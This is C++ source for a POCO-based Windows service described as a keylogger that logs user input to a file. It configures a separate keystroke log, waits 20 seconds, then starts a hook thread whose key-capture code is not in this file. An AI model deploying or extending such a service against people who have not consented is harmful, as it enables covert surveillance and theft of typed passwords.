#include "KeyloggerService.h"

std::atomic<bool> done(false);
std::atomic<bool> done_callback(false);

KeyloggerService::KeyloggerService() : _helpRequested(false) {}

void KeyloggerService::initialize(Application& self)
{
    appPath = Poco::Path(commandPath()).parent().toString();

    loadConfiguration(appPath + "KeyloggerService.properties"); // загрузить конфигурацию из файла или из командной строки
    ServerApplication::initialize(self);

    /*Logger& logger = Logger::get("TestLogger");
    logger.information("This is an informational message");
    logger.warning("This is a warning message");*/

    std::string loggerName = config().getString("application.logger.name");
    std::string logLevel = config().getString("application.logger.level", "debug");
    std::string logFile = config().getString("application.logger.file", "mylog.log");
    std::string rotationLog = config().getString("application.logger.rotation");
    std::string patternLog = config().getString("application.logger.pattern");

    std::string keylogLevel = config().getString("application.keylogger.level", "debug");
    std::string keylogFile = config().getString("application.keylogger.file", "mylog.log");
    std::string keyrotationLog = config().getString("application.keylogger.rotation");
    std::string keypatternLog = config().getString("application.keylogger.pattern");

    /*
    * Создание логера приложения
    */
    Poco::AutoPtr<Poco::FileChannel> pChannel(new Poco::FileChannel);
    pChannel->setProperty("path", appPath + logFile);
    pChannel->setProperty("rotation", rotationLog);
    pChannel->setProperty("archive", "timestamp");
    Poco::AutoPtr<Poco::PatternFormatter> pPatern(new Poco::PatternFormatter);
    pPatern->setProperty("pattern", patternLog);
    Poco::AutoPtr<Poco::FormattingChannel> pAppLoggerFormatterChannel(new Poco::FormattingChannel(pPatern, pChannel));
    Poco::Logger::get("AppLogger").setChannel(pAppLoggerFormatterChannel);
    Poco::Logger::get("AppLogger").setLevel(logLevel);
    /*
    * Создание логера кейлогера
    */
    Poco::AutoPtr<Poco::FileChannel> pChannelKeylog(new  Poco::FileChannel);
    pChannelKeylog->setProperty("path", appPath + keylogFile);
    pChannelKeylog->setProperty("rotation", keyrotationLog);
    pChannelKeylog->setProperty("archive", "timestamp");
    Poco::AutoPtr<Poco::PatternFormatter> pPaternKeylog(new Poco::PatternFormatter);
    pPaternKeylog->setProperty("pattern", keypatternLog);
    Poco::AutoPtr<Poco::FormattingChannel> pKeyloggerLoggerFormatterChannel(new Poco::FormattingChannel(pPaternKeylog, pChannelKeylog));
    Poco::Logger::get("KeyLogger").setChannel(pKeyloggerLoggerFormatterChannel);
    Poco::Logger::get("KeyLogger").setLevel(logLevel);
}

void KeyloggerService::uninitialize()
{
    ServerApplication::uninitialize();
}

void KeyloggerService::defineOptions(OptionSet& options)
{
    ServerApplication::defineOptions(options);

    options.addOption(
        Option("help", "h", "display help information on command line arguments")
        .required(false)
        .repeatable(false));

    options.addOption(
        Poco::Util::Option("run", "r", "Run mode")
        //.callback(Poco::Util::OptionCallback<KeyloggerService>(this, &KeyloggerService::handleOption))
        .noArgument()
    );
}

void KeyloggerService::handleOption(const std::string& name, const std::string& value)
{
    ServerApplication::handleOption(name, value);

    if (name == "help")
        _helpRequested = true;
    if (name == "registerService") {
        _registerService = true;
    }
}

void KeyloggerService::displayHelp()
{
    HelpFormatter helpFormatter(options());
    helpFormatter.setCommand(commandName());
    helpFormatter.setUsage("OPTIONS");
    helpFormatter.setHeader("A keylogger Windows service that logs user input to a file.");
    helpFormatter.format(std::cout);
}

int KeyloggerService::main(const std::vector<std::string>& args)
{
    if (_helpRequested)
    {
        displayHelp();
        return Application::EXIT_OK;
    }

    std::this_thread::sleep_for(std::chrono::seconds(20));

    doneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    KeyResolver keyResolver;
    std::cout << appPath + "tree.json" << std::endl;
    //NullGuardProcessor gProcessor;
    IcuGuardProcessor gProcessor(appPath + "tree.json", &Poco::Logger::get("AppLogger"));
    WordProcessor wProcessor(&gProcessor);
    WorkerThread wc(doneEvent, &keyResolver, &wProcessor);
    // чтобы мы могли остановить сервис нам нужно CreateHookThread сделать detach
    wc.CreateHookThread();

    waitForTerminationRequest();
    // здесь нужно вызвать у HookThread функцию стоп
    done = true;
    SetEvent(doneEvent);
    //WaitForSingleObject(doneEvent, INFINITY);

    while (!done_callback) {
        Sleep(500);
    }
    return Application::EXIT_OK;
}

POCO_SERVER_MAIN(KeyloggerService)